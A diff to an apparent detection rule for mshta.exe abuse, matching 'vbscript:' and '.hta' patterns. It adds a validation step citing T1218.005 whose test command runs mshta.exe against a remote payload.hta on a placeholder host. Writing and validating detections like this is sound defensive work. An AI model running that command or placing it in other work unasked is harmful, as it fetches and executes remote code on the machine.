@@ -23,6 +23,10 @@ detection:
       - 'vbscript:'
       - '.hta'
   condition: selection and payload
+validation:
+  atomic: T1218.005
+  fire: |-
+    mshta.exe http://<host>/payload.hta
 falsepositives:
   - A small number of legacy line-of-business apps still ship HTA front-ends
 level: high
